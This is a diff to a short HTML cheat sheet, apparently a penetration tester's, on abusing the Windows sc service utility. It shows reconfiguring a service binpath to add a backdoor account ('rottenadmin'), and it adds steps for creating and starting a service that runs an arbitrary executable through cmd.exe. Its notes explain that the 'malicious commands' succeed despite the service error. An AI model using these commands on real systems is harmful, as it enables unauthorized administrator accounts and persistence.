@@ -5,4 +5,12 @@
 <title>sc</title>
 </head><body># We can use sc to query, configure and manage windows services.<br/>
 sc qc Spooler<br/>
-sc config &lt;service&gt;&#09;ex: sc config &lt;service&gt; binpath= "net user rottenadmin P@ssword123! /add" </body></html>
+sc config &lt;service&gt;&#09;ex: sc config &lt;service&gt; binpath= "net user rottenadmin P@ssword123! /add" <br/>
+sc create &lt;servicename&gt; binpath= “c:\windows\system32\cmd.exe /k &lt;pathtobinaryexecutable&gt;” DisplayName= &lt;displayname&gt;<br/>
+sc start &lt;servicename&gt;<br/>
+<br/>
+<br/>
+<br/>
+#The sc utility throws an error each time we start the service with one of our malicious commands in the binpath. &nbsp;This is because the net user and net localgroup commands do not point to the service binary and therefore the SCM cannot communicate with the service. &nbsp;Never fear, however, as the error is thrown only after issuing our malicious commands.<br/>
+<br/>
+Easy way around this is to have cmd.exe /k &lt;pathtoexe&gt;. The cmd.exe shell will close, but your second launched process will continue to run. </body></html>
